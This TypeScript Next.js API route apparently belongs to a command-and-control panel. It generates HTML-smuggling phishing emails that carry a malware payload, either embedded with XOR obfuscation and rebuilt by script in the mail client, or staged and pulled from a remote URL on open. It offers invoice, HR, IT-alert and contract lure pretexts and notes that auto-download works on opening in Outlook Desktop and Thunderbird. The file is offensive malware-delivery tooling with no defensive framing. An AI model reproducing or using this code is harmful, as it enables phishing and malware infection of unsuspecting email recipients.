import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"
import { verifyAdmin, toErrorResponse } from "@c2panel/infrastructure/security/admin"
import {
  generateSmuggleEmail,
  generateStagedPullEmail,
  PRETEXT_TEMPLATES,
} from "@c2panel/infrastructure/mailer/html-smuggler"

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const SmuggleRequestSchema = z.discriminatedUnion("mode", [
  z.object({
    mode: z.literal("embed"),
    payloadBase64: z.string().min(1),
    filename: z.string().min(1).max(260),
    decoyHtml: z.string().optional(),
    pretext: z.enum(["invoice", "hr_policy", "it_alert", "contract"]).optional(),
    pretextArgs: z.record(z.string(), z.string()).optional(),
    xorKey: z.number().int().min(1).max(255).optional(),
    mimeType: z.string().optional(),
    autoDownload: z.boolean().default(true),
    downloadLinkText: z.string().optional(),
  }),
  z.object({
    mode: z.literal("staged"),
    payloadUrl: z.string().url(),
    filename: z.string().min(1).max(260),
    decoyHtml: z.string().optional(),
    pretext: z.enum(["invoice", "hr_policy", "it_alert", "contract"]).optional(),
    pretextArgs: z.record(z.string(), z.string()).optional(),
    autoDownload: z.boolean().default(false),
    downloadLinkText: z.string().optional(),
  }),
  z.object({
    mode: z.literal("pretext-only"),
    pretext: z.enum(["invoice", "hr_policy", "it_alert", "contract"]),
    pretextArgs: z.record(z.string(), z.string()).optional(),
  }),
])

function renderPretext(
  pretext: keyof typeof PRETEXT_TEMPLATES,
  args: Record<string, string> = {},
): string {
  switch (pretext) {
    case "invoice":
      return PRETEXT_TEMPLATES.invoice(
        args.companyName ?? "Acme Corp",
        args.invoiceNum ?? "INV-2024-0001",
      )
    case "hr_policy":
      return PRETEXT_TEMPLATES.hr_policy(args.companyName ?? "Acme Corp")
    case "it_alert":
      return PRETEXT_TEMPLATES.it_alert()
    case "contract":
      return PRETEXT_TEMPLATES.contract(args.counterparty ?? "Partner Ltd")
    default:
      return ""
  }
}

// POST /api/admin/communication/mail/smuggler
export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)
    const body = await req.json()
    const parsed = SmuggleRequestSchema.parse(body)

    // Resolve decoy HTML
    const rawDecoy = parsed.mode !== "pretext-only" ? parsed.decoyHtml : undefined
    const decoyHtml =
      rawDecoy ??
      (parsed.mode !== "pretext-only" && parsed.pretext
        ? renderPretext(parsed.pretext, parsed.pretextArgs ?? {})
        : "<p>Please see attached.</p>")

    if (parsed.mode === "pretext-only") {
      return NextResponse.json({
        html: renderPretext(parsed.pretext, parsed.pretextArgs ?? {}),
      })
    }

    if (parsed.mode === "embed") {
      const html = generateSmuggleEmail({
        payloadBase64: parsed.payloadBase64,
        filename: parsed.filename,
        decoyHtml,
        xorKey: parsed.xorKey,
        mimeType: parsed.mimeType,
        autoDownload: parsed.autoDownload,
        downloadLinkText: parsed.downloadLinkText,
      })
      return NextResponse.json({
        html,
        sizeBytes: Buffer.byteLength(html, "utf8"),
        mode: "embed",
        filename: parsed.filename,
        obfuscated: !!parsed.xorKey,
      })
    }

    // staged
    const html = generateStagedPullEmail({
      payloadUrl: parsed.payloadUrl,
      filename: parsed.filename,
      decoyHtml,
      autoDownload: parsed.autoDownload,
      downloadLinkText: parsed.downloadLinkText,
    })
    return NextResponse.json({
      html,
      sizeBytes: Buffer.byteLength(html, "utf8"),
      mode: "staged",
      filename: parsed.filename,
      payloadUrl: parsed.payloadUrl,
    })
  } catch (err) {
    return toErrorResponse(err)
  }
}

// GET /api/admin/communication/mail/smuggler — return pretext list + options
export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)
    return NextResponse.json({
      modes: ["embed", "staged"],
      pretexts: [
        { id: "invoice", label: "Invoice / Billing", args: ["companyName", "invoiceNum"] },
        { id: "hr_policy", label: "HR Policy Update", args: ["companyName"] },
        { id: "it_alert", label: "IT Security Alert", args: [] },
        { id: "contract", label: "Contract Review", args: ["counterparty"] },
      ],
      notes: [
        "embed: payload base64 is XOR-encoded and reconstructed via JS in the email client",
        "staged: email fetches payload from URL on open/click (payload never in email)",
        "autoDownload=true triggers download on email open (works in Outlook Desktop, Thunderbird)",
        "autoDownload=false shows a download button instead",
      ],
    })
  } catch (err) {
    return toErrorResponse(err)
  }
}
